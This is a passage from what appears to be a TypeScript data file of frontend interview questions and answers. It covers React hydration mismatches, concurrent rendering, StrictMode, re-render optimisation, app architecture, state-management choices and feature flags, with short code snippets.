3. **Reading client storage during render.** \`localStorage\`, \`sessionStorage\`, cookies (when accessed through document.cookie), or \`window.matchMedia\`. The server has no access; the client does.
4. **Third-party DOM mutators.** Grammarly injects \`data-gr-*\` attributes; Dark Reader and 1Password rewrite styles and add attributes; ad scripts insert iframes. If they run *before* hydration, the DOM React sees differs from the HTML it emitted.
5. **Conditional CSS classes** driven by user agent, screen size, or feature detection.
6. **Date / number / currency formatting** without explicit \`{ timeZone: 'UTC', locale: 'en-US' }\` — Node and the browser disagree.
7. **Whitespace and HTML structure**: invalid nesting like \`<p><div>\` will be silently fixed by the browser parser, making the DOM diverge from React's expected tree.
8. **\`Math.random()\`-based IDs.** React 18 provides \`useId()\` precisely to solve this: it generates IDs that are stable across server and client.

**Diagnostic workflow.** The React/Next error message in dev mode tells you the offending text or attribute. Set a breakpoint, compare \`document.documentElement.outerHTML\` between the SSR response (View Source) and the rendered DOM (DevTools Elements). Any difference there is your bug. For "browser extension" cases, the diff will show attributes you didn't write.

**Fixes:**

- **Move client-only state into \`useEffect\`.** Render \`null\` (or a skeleton) on the server and the real value after mount. The two-pass approach trades a layout flash for correctness. Pattern: \`const [mounted, setMounted] = useState(false); useEffect(() => setMounted(true), []); if (!mounted) return null;\`.
- **\`suppressHydrationWarning\`** on a leaf you *know* will differ — typically a live timestamp. Only suppresses one level deep; keep the scope tight.
- **\`dynamic(() => import('./X'), { ssr: false })\`** in Next.js for components that fundamentally can't SSR (charts that need window.matchMedia, libraries that hit \`document\` at import time).
- **Always pass an explicit \`timeZone\` and \`locale\`** to \`Intl.DateTimeFormat\`, \`toLocaleString\`, currency formatters.
- **Use \`useId()\`** for generated IDs (form a11y, ARIA targets).
- **Tolerate extension attribute injection** with \`suppressHydrationWarning\` on \`<html>\` or \`<body>\`, since you can't prevent it.
- **Pass server-known values down as props** rather than re-deriving them in the client component (timezone, locale, A/B variant, user agent class).

The mental model: SSR is a **deterministic function** of the request. Anything that introduces randomness or relies on client-only state must be deferred to \`useEffect\` or marked as client-only.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Client-only timestamp without hydration error",
          code: `function Now() {
  const [now, setNow] = useState<string | null>(null);
  useEffect(() => {
    setNow(new Date().toLocaleTimeString());
  }, []);
  // Server renders nothing; client fills in after mount.
  return <span suppressHydrationWarning>{now}</span>;
}`,
        },
      ],
      followUps: [
        "How does React 18 partial hydration handle a mismatch?",
        "When should you reach for `dynamic({ ssr: false })`?",
        "Why does `useId` exist?",
      ],
      commonMistakes: [
        "Sprinkling `suppressHydrationWarning` everywhere — it hides real bugs.",
        "Reading from `localStorage` directly in component body.",
      ],
      performanceConsiderations: [
        "Hydration mismatches cause full client re-render of a subtree → defeats the SSR perf win.",
        "Streaming SSR + Suspense lets you defer hydration of below-the-fold sections.",
      ],
      edgeCases: [
        "Browser extensions injecting attributes (e.g. Grammarly's `data-gramm`) can't be eliminated — must be suppressed.",
        "Whitespace-sensitive HTML (e.g., `<table>` parser differences) can cause silent mismatches.",
      ],
      realWorldExamples: [
        "A theme provider reading `prefers-color-scheme` from cookie + media query is a classic hydration hazard — solve by setting the theme class on `<html>` *before* React boots, via a small inline script.",
      ],
      relatedSlugs: ["explain-react-fiber-deeply", "how-do-concurrent-rendering-and-transitions-work"],
      companyTags: ["Vercel", "Shopify", "Stripe"],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 12,
    },
  },
  {
    title: "How do concurrent rendering and transitions work?",
    question: {
      id: "how-do-concurrent-rendering-and-transitions-work",
      slug: "how-do-concurrent-rendering-and-transitions-work",
      title: "How do concurrent rendering and transitions work?",
      category: "react",
      tags: ["concurrent-mode", "transitions", "useTransition", "scheduler", "react-18"],
      difficulty: "hard",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "Concurrent rendering lets React prepare multiple UI versions in the background. `useTransition` marks a state update as non-urgent so React can interrupt it for higher-priority work like typing.",
      answer: `Concurrent rendering is React 18's headline change, and it's a model shift, not a single API. Pre-18, *every* \`setState\` was "urgent": React started rendering, ran the whole tree to completion synchronously, and committed. A 100ms render meant 100ms of unresponsive UI. Post-18, React assigns each update to a **lane** (priority bucket on a 31-bit bitmask), and the reconciler is allowed to:

- **Pause** an in-progress render between fibers and check for higher-priority work.
- **Restart** rendering at a higher priority — discarding the in-progress WIP tree because render is pure.
- **Branch**: render the next tree in memory while keeping the current tree on screen (no flicker).
- **Drop**: skip rendering for an interrupted-then-superseded update.

This is only safe because the render phase is **pure** (no side effects); commits remain atomic and synchronous.

**Lanes (high → low priority):** SyncLane (legacy sync), InputContinuousLane (text input, hover), DefaultLane (most updates), TransitionLane(s) (\`startTransition\`), IdleLane, OffscreenLane. Multiple updates can be batched into the same lane; React always works on the highest-priority lane with pending work.

**\`useTransition\`** explicitly tags a state update as non-urgent:

\`\`\`ts
const [isPending, startTransition] = useTransition();
startTransition(() => setFilter(input));
\`\`\`

What happens: React commits any urgent updates that arrive (the controlled input value, hover styles) at high priority and renders the transition update in the background. \`isPending\` is \`true\` until the transition lands, letting you show a subtle "loading" state without blocking input. The killer use case: filtering a 10,000-item list as the user types — the input feels instant because typing is urgent, the filtered list catches up when there's slack.

**\`useDeferredValue(value)\`** is the value-side equivalent. It returns a version of \`value\` that *lags* — initially equal to the new value, but React may render with the old value first and re-render with the new value at lower priority. Useful when the expensive component is a leaf you don't control (a chart, a code editor) and you can't move its \`setState\` behind \`startTransition\`.

\`\`\`ts
const deferredQuery = useDeferredValue(query);
return <HeavyResults query={deferredQuery} />;
\`\`\`

**Automatic batching.** React 18 also batches all updates within the same event/microtask, even across async boundaries (promises, timeouts, native handlers). Pre-18, only React-synthetic event handlers batched. Together with concurrency, this dramatically reduces unnecessary intermediate renders.

**Suspense + concurrency.** A component can throw a Promise during render. React unwinds the WIP tree to the nearest \`<Suspense fallback>\` and either (a) keeps the old UI visible while loading the new tree at low priority, or (b) shows the fallback if the boundary is fresh. Resuming when the promise settles is straightforward because rendering is restartable. This is how the App Router streams: each \`<Suspense>\` is a streaming chunk.

**Practical gotchas:**

- **Render must be pure.** Side effects in render (mutating refs, logging, fetching) may now run multiple times — StrictMode in dev intentionally double-invokes components to surface this.
- **External stores need \`useSyncExternalStore\`** to avoid *tearing*: during concurrent rendering, two parts of the tree might otherwise read different snapshots of a Zustand/Redux store.
- **Transitions don't make slow code fast** — they just keep urgent work responsive. The total CPU still has to be paid. Pair transitions with memoization (\`React.memo\`, \`useMemo\`) so background renders don't re-do work.
- **You can't \`startTransition\` around input value updates** — text-input feedback must be urgent or it feels broken. The pattern is "urgent input → deferred derivation."
- **\`isPending\` flips many times during a long transition**, so use it to gate a non-disruptive spinner, not a full skeleton.

In short: concurrency turns React's reconciler from "always sync" into a *scheduler* that respects user input above background work. \`useTransition\` / \`useDeferredValue\` are the two opt-ins; Suspense is the I/O integration.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "useTransition for keep-typing-smooth filtering",
          code: `function Search({ items }: { items: Item[] }) {
  const [query, setQuery] = useState("");
  const [filtered, setFiltered] = useState(items);
  const [isPending, startTransition] = useTransition();

  return (
    <>
      <input
        value={query}
        onChange={(e) => {
          setQuery(e.target.value);                // urgent
          startTransition(() => {                  // non-urgent
            setFiltered(items.filter(/* expensive */));
          });
        }}
      />
      {isPending && <span>Updating…</span>}
      <List items={filtered} />
    </>
  );
}`,
        },
      ],
      followUps: [
        "What's the difference between useTransition and useDeferredValue?",
        "Why does React need useSyncExternalStore?",
        "How does Suspense interact with transitions?",
      ],
      commonMistakes: [
        "Wrapping every update in startTransition — defeats the purpose.",
        "Putting input value updates inside startTransition (input feels laggy).",
      ],
      performanceConsiderations: [
        "Transitions don't make work cheaper — they just deprioritize it.",
        "If the urgent path itself is slow, transitions won't help.",
      ],
      edgeCases: [
        "Synchronous DOM reads (`element.offsetHeight`) inside a transition can force layout and ruin pacing.",
        "Suspense fallbacks inside transitions are suppressed if the previous content is still showable.",
      ],
      realWorldExamples: [
        "Linear's instant-feeling search uses transitions to keep typing smooth while filtering 100k+ items.",
      ],
      relatedSlugs: ["explain-react-fiber-deeply", "what-causes-hydration-mismatches-in-next-js"],
      companyTags: ["Meta", "Vercel", "Linear"],
      estimatedReadingMinutes: 8,
      estimatedSolvingMinutes: 12,
    },
  },
  {
    title: "Why does StrictMode behave differently in development?",
    question: {
      id: "why-does-strictmode-behave-differently-in-development",
      slug: "why-does-strictmode-behave-differently-in-development",
      title: "Why does StrictMode behave differently in development?",
      category: "react",
      tags: ["strict-mode", "react-18", "side-effects", "debugging"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "StrictMode intentionally double-invokes components, effects, and reducers in development to surface impure renders and effect cleanup bugs that would break under concurrent rendering.",
      answer: `StrictMode is a development-only opt-in wrapper (\`<React.StrictMode>...\`) that activates extra correctness checks. It is silent in production builds — Next.js enables it by default in dev, but the checks are *only* there to surface bugs you'd otherwise hit as production heisenbugs once concurrent features (transitions, Suspense, offscreen) start interrupting and replaying renders.

The behaviors that confuse developers in React 18+:

1. **Components render twice on mount.** React calls your component function, throws the result away, then calls it again. If your render is pure (just takes props/state → returns JSX), both outputs are identical and the second one is committed. If your render has side effects — pushing to a module-level array, incrementing a counter, calling \`fetch\` at render time, mutating props — those side effects happen twice and you'll see them. That's the *point*: under concurrent rendering, React is *allowed* to render a component multiple times before committing (or to discard a render entirely), so impure renders are bugs.

2. **Effects mount → unmount → mount again.** \`useEffect\` (and \`useLayoutEffect\`) fire, then React simulates an unmount by running the cleanup, then fires the effect again. So a \`useEffect(() => { subscribe(); }, [])\` without a cleanup leaks one subscription on every dev mount. Two subscriptions go to one socket, double events fire, requests duplicate. This is the same shape of bug that would later appear in production when React's Offscreen / activity APIs unmount and remount a tree to keep state alive in the background. StrictMode forces you to write idempotent setups paired with symmetric teardowns.

3. **Reducers and \`useState\` lazy initializers run twice.** If your reducer or \`useState(() => initialize())\` initializer is impure (logs, fetches, allocates resources), you'll see it. Reducers must be pure; initializers should be too.

4. **Refs and \`useMemo\` factory functions** may be invoked more than once. Don't store "do this once" side effects in \`useMemo\` — that's an anti-pattern StrictMode exposes.

5. **Deprecation warnings** for unsafe legacy lifecycles (\`componentWillMount\`, \`componentWillUpdate\`, \`componentWillReceiveProps\`), string refs, findDOMNode, and old context API.

**Why React designed it this way.** Concurrent rendering can pause an in-flight render, drop it for a higher priority update, then redo it. With Suspense and Offscreen, a subtree can be mounted invisibly, frozen, then re-mounted later. Hot reload re-mounts components without a navigation. If your component assumes "useEffect runs exactly once," any of these patterns will silently break in prod with cache duplication, event handler double-fire, or stale data. By double-invoking in dev, StrictMode collapses the timeline so the bug shows up on first reload, where you can fix it.

**The mental model shift:** stop thinking "useEffect runs on mount." Think *"useEffect runs whenever React decides the component is being attached, possibly more than once. Whatever I do in the setup, I must reverse in the cleanup so any number of attach/detach cycles is correct."*

**Common fixes:**

- \`useEffect(() => { const id = bus.subscribe(h); return () => bus.unsubscribe(id); }, [])\` — pair every subscribe with an unsubscribe.
- For fetches, use an \`AbortController\` whose \`abort()\` is the cleanup, plus an "ignore" flag if you setState in the response.
- For event listeners and timers, always return a cleanup that mirrors setup.
- For one-time module-level work (analytics init), guard with an \`if (initialized) return;\` outside the effect, or move to a ref.

**Production behavior.** None of the double-invocation runs in production builds, so don't write code that depends on it. But the *bugs* it exposes are real — they manifest in production via concurrent features, hot reload, or future Offscreen support. Keeping StrictMode on in dev is one of the cheapest investments in app correctness.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Effect that breaks under StrictMode → fix with cleanup",
          code: `// BAD — subscription leaks on the first dev mount
useEffect(() => {
  const sub = bus.subscribe(handler);
  // missing cleanup → after unmount/remount cycle, two subscriptions exist
}, []);

// GOOD — symmetric cleanup
useEffect(() => {
  const sub = bus.subscribe(handler);
  return () => sub.unsubscribe();
}, [handler]);`,
        },
      ],
      followUps: [
        "Why is double-invocation only in development?",
        "How does this interact with data fetching in effects?",
        "What's the right pattern for one-time setup?",
      ],
      commonMistakes: [
        "Disabling StrictMode to silence the issue instead of fixing the effect.",
        "Initializing analytics / network calls in effects without idempotency.",
      ],
      performanceConsiderations: [
        "Dev-only — zero production impact.",
        "Surfaces bugs that would otherwise cause double-fetches and stale subscriptions.",
      ],
      edgeCases: [
        "Refs created in render are stable across the double mount, but effects that *use* refs may still need defensive resets.",
        "Animations started in effects need to be cancelled on cleanup or you'll see two playing.",
      ],
      realWorldExamples: [
        "Auto-saving an analytics 'page_view' in useEffect → fires twice in dev, twice in prod transitions. Move to a route-change handler instead.",
      ],
      relatedSlugs: ["explain-react-fiber-deeply", "how-do-concurrent-rendering-and-transitions-work"],
      companyTags: ["Meta", "Vercel"],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 10,
    },
  },
  {
    title: "How would you prevent unnecessary re-renders in a dashboard with live updates?",
    aliases: ["prevent unnecessary re-renders dashboard live updates"],
    question: {
      id: "how-would-you-prevent-unnecessary-re-renders-in-a-dashboard-with-live-updates",
      slug: "how-would-you-prevent-unnecessary-re-renders-in-a-dashboard-with-live-updates",
      title: "How would you prevent unnecessary re-renders in a dashboard with live updates?",
      category: "react",
      subcategory: "Performance",
      tags: ["re-renders", "memoization", "selectors", "performance", "react"],
      difficulty: "hard",
      frequency: "very-high",
      seniority: "senior",
      shortDescription:
        "Slice state by widget, use selectors with referential stability, isolate live-update components behind their own subscriptions, and memoize where measurement justifies it.",
      answer: `A live dashboard — trading desk, observability board, multiplayer presence — is the canonical re-render problem. Tens of websocket messages per second flow into the app; each one triggers a state update; if the whole tree subscribes to one big state blob, the whole tree re-renders, GC churns, dropped frames everywhere. The fix is not to chase memoization everywhere — it's to design the *data flow* so each update touches exactly the components that depend on the changed slice.

**Strategies, ordered by impact:**

1. **Slice the store by domain key.** Don't keep \`{ allTicks: Tick[] }\`. Keep \`{ ticks: { [symbol]: Tick } }\` and let each widget subscribe to its key. With Zustand, that's a selector \`useStore(s => s.ticks[symbol])\` — only re-renders when that one entry changes. Redux + \`useSelector\` does the same if you avoid creating new arrays/objects in the selector. Jotai atoms naturally give per-atom subscriptions. The win: a price update for AAPL re-renders only the AAPL card, not the 200 others.

2. **Stable selectors / memoized derivations.** Selectors that return new arrays on every call (\`s => s.items.filter(...)\`) defeat reference equality and force every subscriber to re-render even when no logical change happened. Wrap them with \`reselect\`'s \`createSelector\`, Zustand's \`useShallow\`, or your own memo. A correctly memoized derived selector is the single highest-leverage change in most dashboards.

3. **Push subscriptions to the leaves.** The websocket handler should write into the store; subscribers pull. *Don't* lift the live state to a top-level provider and pass it down as props — that forces the whole tree through reconciliation. Each leaf decides which slice it cares about. This also makes the leaf a self-contained "live widget" you can test in isolation.

4. **Throttle / coalesce upstream.** For high-frequency feeds, throttle into the store at 30–60Hz, not every WS message. Use \`requestAnimationFrame\` batching or a fixed-window aggregator. Render budget is the constraint; the user can't see 500 updates/sec anyway.

5. **\`React.memo\` for non-trivial leaves**, paired with stable callbacks (\`useCallback\`) and stable derived data. Pure \`React.memo\` without stable refs in is *worthless* — props will still differ each render. Memoization is only useful when (a) the parent re-renders often, (b) the child render is non-trivial, and (c) most parent re-renders don't actually change the child's relevant props.

6. **\`useDeferredValue\` / \`startTransition\`** for *derived* views (charts, aggregates) where it's OK to lag one frame behind the latest tick. The latest value still renders to the lightweight readout; the heavy chart catches up at lower priority.

7. **Virtualization.** Long tables of streaming rows (\`react-window\`, \`@tanstack/react-virtual\`) — only the visible window mounts. Combined with row-level memoization, even 50k rows are cheap.

8. **Stable keys on list rows** (\`key={row.id}\`, not array index). React's reconciler diffs by key — wrong keys destroy and re-mount every row on each update.

9. **\`useSyncExternalStore\`** for external stores in concurrent React. It guarantees a consistent read across the tree (no tearing) and gives you the cheapest possible subscription path.

10. **Move work off the render thread.** Heavy aggregation, decoding, or filtering for 10k+ rows belongs in a Web Worker. The main thread should be a thin renderer of pre-computed slices.

**Anti-patterns to avoid:**

- Wrapping every component in \`React.memo\` "just in case." Comparison costs CPU; closure capture inflates memory; debugging gets harder. Profile first.
- Putting the live state in React Context. Context broadcasts to *every* consumer on every change; it's the opposite of what you want for high-frequency updates.
- Using indexes as keys. Use IDs.
- Selectors that allocate objects/arrays inline.

**Profiling workflow:** use the React DevTools Profiler — record a few seconds of live updates, look at the flamegraph, and find components rendering with no commit-relevant prop change. Each one is either a missing memo, a missing selector slice, or a missing stable reference. Fix the worst three and the dashboard usually stops dropping frames.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Per-symbol subscription so only the affected card re-renders",
          code: `// store.ts (Zustand)
type Tick = { price: number; ts: number };
type State = { ticks: Record<string, Tick>; setTick: (sym: string, t: Tick) => void };
export const useTicks = create<State>((set) => ({
  ticks: {},
  setTick: (sym, t) => set((s) => ({ ticks: { ...s.ticks, [sym]: t } })),
}));

// Each card subscribes to *its* symbol only.
function Card({ symbol }: { symbol: string }) {
  const tick = useTicks((s) => s.ticks[symbol]);   // referentially stable per-symbol
  return <div>{symbol}: {tick?.price.toFixed(2)}</div>;
}`,
        },
      ],
      followUps: [
        "When does React.memo hurt performance?",
        "How would you profile this in production?",
        "Why is shallow equality often enough?",
      ],
      commonMistakes: [
        "Storing live data in `useState` at the page level — every tick re-renders the world.",
        "Selectors that return new objects every call.",
        "Using `useMemo` to 'fix' renders without verifying it changes anything.",
      ],
      performanceConsiderations: [
        "Memoization isn't free — comparison cost + retained closures.",
        "60 fps gives you a 16ms budget per frame; aim for <8ms render to leave room for everything else.",
      ],
      edgeCases: [
        "Context value identity: passing a fresh object every render forces all consumers to re-render.",
        "List virtualization can interact badly with focus restoration in tables.",
      ],
      realWorldExamples: [
        "Trading dashboards (price ticks), observability tools (Datadog, Honeycomb live views), Linear's real-time sync.",
      ],
      seniorDiscussion:
        "Discuss tear-free reads with `useSyncExternalStore`, why context isn't a state manager, and how to design the data flow so updates fan out to leaves without lifting state up.",
      relatedSlugs: [
        "explain-react-fiber-deeply",
        "how-do-concurrent-rendering-and-transitions-work",
        "shallow-copy-vs-structural-sharing",
        "context-vs-redux-vs-zustand-when-to-use-what",
      ],
      companyTags: ["Linear", "Vercel", "Stripe", "Bloomberg"],
      estimatedReadingMinutes: 9,
      estimatedSolvingMinutes: 15,
    },
  },

  // ============================================================
  // FRONTEND ARCHITECTURE
  // ============================================================
  {
    title: "How would you structure a scalable frontend app with 100+ pages?",
    question: {
      id: "structure-scalable-frontend-app-100-pages",
      slug: "structure-scalable-frontend-app-100-pages",
      title: "How would you structure a scalable frontend app with 100+ pages?",
      category: "system-design",
      subcategory: "Frontend Architecture",
      tags: ["architecture", "scalability", "monorepo", "feature-based", "design-system"],
      difficulty: "hard",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "Feature-based folder structure, shared packages for design system / utils, route-level code splitting, owned layouts per area, contracts at module boundaries.",
      answer: `Once a frontend grows past 100 pages it almost always also has 10+ teams committing to it. The architecture stops being a *technical* problem and becomes a **change-isolation** problem: how do I let team A ship without breaking team B, without forcing a global rebuild, and without waiting for a slow CI? The answer is a set of conventions that minimize coupling at every layer.

**1. Folder structure: feature-first, not type-first.**

\`\`\`
apps/
  web/
    app/                    # Next.js App Router — thin route shells
      (marketing)/
      (app)/
      (admin)/
    features/
      checkout/             # everything checkout: components, hooks,
                            # server actions, tests, schemas
      catalog/
      account/
    shared/                 # cross-feature primitives ONLY
packages/
  ui/                       # design system, headless + styled
  config/                   # eslint, tsconfig, tailwind preset
  lib/                      # cross-app utilities (date, money, http)
  types/                    # shared TS types / Zod schemas
\`\`\`

A page in \`app/\` is thin — it just composes feature components. The feature folder owns its UI, hooks, data fetchers, server actions, and tests. **Imports between feature folders are forbidden** — enforce with \`eslint-plugin-boundaries\`, \`eslint-plugin-import\`, or Nx tags. Cross-feature communication goes through a shared package with a stable contract (events, a shared store, or URL params). The "boring rule" — checkout cannot reach into catalog — is what lets the two teams ship independently.

**2. Routing & layouts.** Next.js App Router with route groups (\`(marketing)\`, \`(app)\`, \`(admin)\`) gives each major area its own layout and middleware. Parallel routes (\`@modal\`) and intercepting routes handle slot composition. Each leaf route should be a few lines: parse params, render a feature component.

**3. Code splitting.** Route-level splitting is automatic. For very heavy widgets (charts, code editors, maps) use \`next/dynamic({ ssr: false })\`. Aggressively tree-shake the design system: keep components as separate entry points (\`@ui/button\`, not \`@ui\`) and avoid barrel files that defeat tree shaking. Set a bundle-size budget per route in CI.

**4. State strategy.** Server state goes through TanStack Query or RSC + Server Actions. Client state lives **inside the feature** (\`useState\`, \`useReducer\`, a feature-scoped Zustand store). Global state is reserved for *truly* cross-cutting concerns: theme, auth user, feature flags, toast queue. Reach for Context only when (a) prop-drilling exceeds three levels and (b) the value is genuinely shared. A global store is the most common architectural smell — it turns every feature into a transitive dependency of every other.

**5. Data contracts.** Every API boundary should be typed and *validated*. Use Zod schemas at the edge: parse the response, throw on schema drift, types flow inward for free. Generate types from OpenAPI / GraphQL where you don't own the schema. A shared \`packages/types\` package is the single source of truth.

**6. Design system.** A separate package consumed as a peer dep. Components are headless + styled (Radix / Headless UI primitives + your tokens) so accessibility is non-negotiable. Versioned with changesets so a breaking change is intentional and surfaced in CI.

**7. Build & CI.** Turborepo or Nx for incremental builds, with remote cache. CI runs only the affected packages on each PR. Preview deployments per PR. Type-check, lint, and unit tests in parallel; e2e only against changed routes.

**8. Ownership & guardrails.** CODEOWNERS at the feature folder; dashboards per feature; an error-budget / SLO per route. The platform team owns \`packages/*\`; product teams own a feature folder end-to-end. Architecture decision records (ADRs) checked into the repo so the *why* is preserved.

**9. Observability.** Real-user metrics (LCP / INP / CLS) tagged per route. Source-mapped errors via Sentry / Bugsnag grouped by feature. A weekly perf budget review is cheaper than emergency fixes.

The thread connecting all of this is "make the smallest reasonable change cheap and the wrong change loud." Conventions that the linter or codeowners can enforce are worth more than any clever runtime architecture.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Boundary lint rule example",
          code: `// .eslintrc — forbid cross-feature imports
{
  "rules": {
    "import/no-restricted-paths": ["error", {
      "zones": [
        {
          "target": "./src/features/checkout",
          "from": "./src/features",
          "except": ["./checkout"],
          "message": "Features must not import from sibling features."
        }
      ]
    }]
  }
}`,
        },
      ],
      followUps: [
        "When would you reach for module federation / micro-frontends?",
        "How do you keep the design system in sync across teams?",
        "What's your strategy for shared global state?",
      ],
      commonMistakes: [
        "Type-first folder structure (`/components`, `/hooks`, `/utils`) — scales poorly past 50 components.",
        "Putting routing logic into feature files — keeps composition entangled.",
        "One global Redux store for everything.",
      ],
      performanceConsiderations: [
        "Bundle splits per route + lazy heavy widgets.",
        "Watch for design-system regressions — one prop change can rebuild every page.",
      ],
      edgeCases: [
        "Migrations are the real test — feature isolation lets you migrate one slice at a time.",
      ],
      realWorldExamples: [
        "Shopify Admin, Vercel dashboard, Linear — all use feature-based + shared package patterns.",
      ],
      seniorDiscussion:
        "Discuss when to split into separate apps (different release cadences, different auth domains) vs keep as one with route groups.",
      relatedSlugs: [
        "context-vs-redux-vs-zustand-when-to-use-what",
        "how-would-you-implement-feature-flags-safely",
        "how-would-you-design-a-reusable-component-library-across-teams",
      ],
      companyTags: ["Shopify", "Vercel", "Linear", "Atlassian"],
      estimatedReadingMinutes: 10,
      estimatedSolvingMinutes: 20,
    },
  },
  {
    title: "Context vs Redux vs Zustand — when to use what?",
    aliases: ["Context Redux Zustand"],
    question: {
      id: "context-vs-redux-vs-zustand-when-to-use-what",
      slug: "context-vs-redux-vs-zustand-when-to-use-what",
      title: "Context vs Redux vs Zustand — when to use what?",
      category: "react",
      tags: ["state-management", "context", "redux", "zustand", "architecture"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "Context for low-frequency cross-cutting values (theme, locale). Zustand for medium app-wide state with selector-based subscriptions. Redux Toolkit when you need devtools, time-travel, and a strict update protocol.",
      answer: `The single biggest mistake when comparing these three is treating them as alternatives to the same job. They aren't. Context, Zustand, and Redux solve overlapping but **different** problems, and the right modern app often uses all three plus a server-cache library. Picking correctly comes down to: (a) is this server state or client state? (b) how *often* does it change? (c) do many components subscribe to *different slices* of it?

**Context** is a *value distribution* primitive, not a state manager. \`React.createContext\` lets a parent broadcast a value down the tree; descendants opt in with \`useContext\`. Crucially, **there is no selector layer**: when the provider's value reference changes, **every** consumer re-renders, full stop. That's fine for values that change rarely (theme, locale, auth user, feature-flag map, DI container references) and ruinous for anything updated at interactive frequencies. Context combined with \`useReducer\` is sometimes called "the poor man's Redux," and that's exactly when people learn the no-selector problem — toggling one item in a 200-item list re-renders the whole tree.

**Zustand** is a tiny (~1KB gzipped) store *outside* React. \`create()\` returns a hook; consumers pass a selector \`useStore(s => s.something)\` and only re-render when that slice changes by reference. No provider needed; the store is just a module export. Pros: trivial to learn, no boilerplate, selectors give per-slice subscriptions, integrates with \`useSyncExternalStore\` for tear-free concurrent reads, supports middleware (persist, devtools, immer). It's an excellent default for medium-complexity client state — cart, multi-step wizard, modal stack, UI prefs.

**Redux Toolkit** is the heavyweight. Strict action/reducer protocol, RTK Query for server cache, time-travel devtools, middleware (thunks, sagas, listeners), structured serialization, opinionated slice pattern. The cost is verbosity and ceremony. It pays off when (a) the team is large enough that the strict protocol prevents architectural drift, (b) you need rich devtools for debugging complex flows (financial dashboards, animation editors), (c) you need undo/redo or time travel, (d) you have a structured server-cache problem that benefits from RTK Query's tagged invalidation. For a 5-person team building a CRUD app, Redux is overkill.

**Server state is a separate category.** It is not a "client state manager" problem. TanStack Query, SWR, RTK Query, Apollo, urql all specialize here: caching, deduplication, request coalescing, background refetch, mutation invalidation, optimistic updates, polling. *Use one of them* for anything that originated on the server. Don't dump it into Zustand or Redux and reinvent the cache.

**Decision matrix:**

| Need                                   | Choose                       |
|----------------------------------------|------------------------------|
| Theme, locale, auth user object        | Context                      |
| Toast queue, modal stack               | Zustand                      |
| Cart, filters, wizard, UI prefs        | Zustand                      |
| Server data, mutations, cache          | TanStack Query / RTK Query   |
| Time travel, undo/redo, devtools       | Redux Toolkit                |
| Form state                             | React Hook Form              |
| Atomic, dependency-graph derived state | Jotai / Recoil               |
| Cross-tab sync, persistence            | Zustand + persist middleware |

**Modern stack pattern** I see most often in 2025: **Server state in TanStack Query** (or RSC + Server Actions for Next.js), **client state in Zustand** (one feature-scoped store per feature), **cross-cutting values in Context** (theme, auth user). Redux Toolkit only when its specific affordances earn rent. Jotai / Recoil when the state is naturally a graph of small derived atoms (Figma-style apps).

**Common pitfalls:**

- "Just use Context" for everything → re-render storms. Split contexts by update frequency.
- Redux for a small app → ceremony with no payoff.
- Putting server data in Redux without an RTK Query layer → reinventing cache invalidation badly.
- Zustand stores at module scope persisting across SSR requests → memory leaks or cross-user data leaks. Use a per-request store with React's \`use()\` or pass via Context.

Pick by *change frequency × number of consumers × need for time travel*, not by Twitter trend.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Zustand with selector subscription",
          code: `import { create } from "zustand";

const useStore = create<{ count: number; inc: () => void }>((set) => ({
  count: 0,
  inc: () => set((s) => ({ count: s.count + 1 })),
}));

// Only re-renders when count changes
function Counter() {
  const count = useStore((s) => s.count);
  return <span>{count}</span>;
}

// Only re-renders when inc identity changes (never)
function IncButton() {
  const inc = useStore((s) => s.inc);
  return <button onClick={inc}>+</button>;
}`,
        },
      ],
      followUps: [
        "Why does Context cause perf issues in a fast-updating store?",
        "How does Zustand achieve no-provider stores?",
        "When does TanStack Query overlap with these?",
      ],
      commonMistakes: [
        "Using Context for high-frequency state (mouse position, scroll) — re-renders cascade.",
        "Storing server data in Redux when TanStack Query handles caching/invalidation for free.",
      ],
      performanceConsiderations: [
        "Context value identity matters — wrap providers with `useMemo` or split into multiple contexts.",
        "Zustand selectors should return primitives or use shallow equality.",
      ],
      edgeCases: [
        "Context + `useReducer` looks like a Redux replacement until your app grows; reach for a real store before re-render storms hit.",
      ],
      realWorldExamples: [
        "shadcn/ui ships theme via Context; product surfaces use Zustand for filters; payment flows use Redux Toolkit for the strict step machine.",
      ],
      relatedSlugs: [
        "how-would-you-prevent-unnecessary-re-renders-in-a-dashboard-with-live-updates",
        "structure-scalable-frontend-app-100-pages",
      ],
      companyTags: ["Vercel", "Linear", "Stripe"],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 12,
    },
  },
  {
    title: "How would you implement feature flags safely?",
    question: {
      id: "how-would-you-implement-feature-flags-safely",
      slug: "how-would-you-implement-feature-flags-safely",
      title: "How would you implement feature flags safely?",
      category: "system-design",
      tags: ["feature-flags", "rollouts", "experimentation", "safety"],
      difficulty: "medium",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "Evaluate flags server-side when possible, ship a typed flag client, default to OFF, kill-switch every change, and prune flags aggressively after launch.",
      answer: `Feature flags are how mature teams decouple **deploy** from **release**: you can ship code dark, enable it for 1% of users, watch metrics, and roll forward or kill the change without redeploying. Done badly, they create runtime hazards (a stale flag fires in production six months later), security issues (flag names leak product plans), and a codebase littered with dead branches no one dares delete. A safe implementation has roughly seven pieces.

**1. A single source of truth.** Use a flag service — LaunchDarkly, Statsig, GrowthBook, ConfigCat, Optimizely, or a homegrown service backed by a database with auditing. Never hardcode flag conditions in components, never use environment variables as flags (you can't change them at runtime, and they couple flagging to deploy). The service should expose a typed config, audit log, and rollback button.

**2. Server-side evaluation when possible.** Evaluate flags on the server (in Next.js: RSC, route handlers, edge middleware) and embed the resolved booleans into the rendered HTML. This avoids client flicker (the "v1 → v2 swap" you can see), prevents leaking unreleased flag names into the JS bundle (\`christmas_promo_2026\` shows up in Sources tab), and keeps the SSR cache key consistent with the variant. For Next.js, libraries like Vercel's \`@vercel/flags\` and GrowthBook's SDK handle this idiomatically.

